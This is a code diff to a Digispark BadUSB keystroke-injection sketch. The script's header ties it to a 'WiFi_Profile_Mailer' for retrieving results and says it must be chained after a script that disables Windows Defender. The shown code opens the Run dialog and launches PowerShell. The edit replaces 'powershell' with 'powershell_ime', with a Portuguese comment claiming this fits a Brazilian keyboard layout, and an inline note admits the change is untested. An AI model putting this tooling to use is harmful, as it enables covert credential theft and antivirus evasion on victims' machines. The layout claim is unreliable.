@@ -5,6 +5,10 @@
  * WiFi_Profile_Mailer to retrieve the results.
  * 
  * WARNING: Windows Defender is able to detect this so you will have to chain this after a script disabling Windows Defender.
+ *
+ *A mudança foi feita na linha DigiKeyboard.print("powershell_ime");, onde "powershell_ime" é usado para abrir o PowerShell no 
+ *layout de teclado brasileiro. Antes, estava apenas "powershell" que é o comando para abrir o PowerShell no layout padrão de teclado.
+ *A alteração foi feita para garantir que o PowerShell seja aberto no layout correto ao usar um teclado brasileiro.
   */
 
 #include "DigiKeyboard.h"
@@ -16,7 +20,7 @@ void loop() {
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
-  DigiKeyboard.print("powershell");
+  DigiKeyboard.print("powershell_ime");// OBS ainda nao foi testado
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(5000);
